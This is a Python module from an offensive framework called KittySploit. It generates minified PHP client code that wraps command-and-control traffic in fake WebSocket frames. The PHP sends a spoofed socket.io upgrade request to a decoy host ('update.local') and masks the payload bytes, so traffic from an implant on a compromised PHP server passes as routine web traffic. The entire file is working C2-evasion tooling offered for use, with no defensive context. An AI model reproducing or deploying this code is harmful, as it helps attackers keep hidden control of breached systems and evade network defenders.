#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Optional

from kittysploit import Transform
from modules.transforms.python.protocol.websocket_mimic import Module as PythonWebSocketTransform


class Module(Transform, PythonWebSocketTransform):
    """PHP WebSocket binary frame mimic transform."""

    SUPPORTED_CLIENT_LANGUAGES = ["php"]

    __info__ = {
        "name": "PHP WebSocket Mimic Transform",
        "description": "Wraps C2 bytes in WebSocket-like binary frames and emits PHP client code.",
        "author": "KittySploit Team",
        "version": "1.0.0",
    }

    def generate_client_code(self, language: str) -> Optional[str]:
        if language != "php":
            return None
        return (
            "$xf_buf='';$xf_first=true;"
            "function _xf_ws_frame($c){$l=strlen($c);if($l>65535){$c=substr($c,0,65535);$l=65535;}$h=chr(0x82);"
            "if($l<126){$h.=chr(0x80|$l);}else{$h.=chr(0x80|126).chr(($l>>8)&255).chr($l&255);}"
            "$m=function_exists('random_bytes')?random_bytes(4):pack('N',mt_rand());$o='';for($i=0;$i<$l;$i++){$o.=chr(ord($c[$i])^ord($m[$i%4]));}return $h.$m.$o;}"
            "function _xf_encode($d){global $xf_first;if($d===''){return $d;}$out='';"
            "if($xf_first){$out=\"GET /socket.io/?transport=websocket HTTP/1.1\\r\\nHost: update.local\\r\\nUpgrade: websocket\\r\\nConnection: Upgrade\\r\\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\\r\\nSec-WebSocket-Version: 13\\r\\n\\r\\n\";$xf_first=false;}"
            "$i=0;$l=strlen($d);while($i<$l){$c=substr($d,$i,65535);$i+=strlen($c);$out.=_xf_ws_frame($c);}return $out;}"
            "function _xf_decode($d){global $xf_buf;$xf_buf.=$d;$out='';"
            "while($xf_buf!==''){if(strncmp($xf_buf,'HTTP/',5)===0||strncmp($xf_buf,'GET ',4)===0||strncmp($xf_buf,'POST ',5)===0){$e=strpos($xf_buf,\"\\r\\n\\r\\n\");if($e===false){break;}$xf_buf=substr($xf_buf,$e+4);continue;}"
            "if(strlen($xf_buf)<2){break;}$b=ord($xf_buf[1]);$masked=($b&0x80)!==0;$ln=$b&0x7f;$pos=2;"
            "if($ln===126){if(strlen($xf_buf)<4){break;}$ln=(ord($xf_buf[2])<<8)|ord($xf_buf[3]);$pos=4;}else if($ln===127){$xf_buf=substr($xf_buf,1);continue;}"
            "if($ln>65535){$xf_buf=substr($xf_buf,1);continue;}$mask='';if($masked){if(strlen($xf_buf)<$pos+4){break;}$mask=substr($xf_buf,$pos,4);$pos+=4;}"
            "$end=$pos+$ln;if(strlen($xf_buf)<$end){break;}$p=substr($xf_buf,$pos,$ln);$xf_buf=substr($xf_buf,$end);"
            "if($masked){$u='';for($i=0;$i<strlen($p);$i++){$u.=chr(ord($p[$i])^ord($mask[$i%4]));}$p=$u;}$out.=$p;}return $out;}"
        )
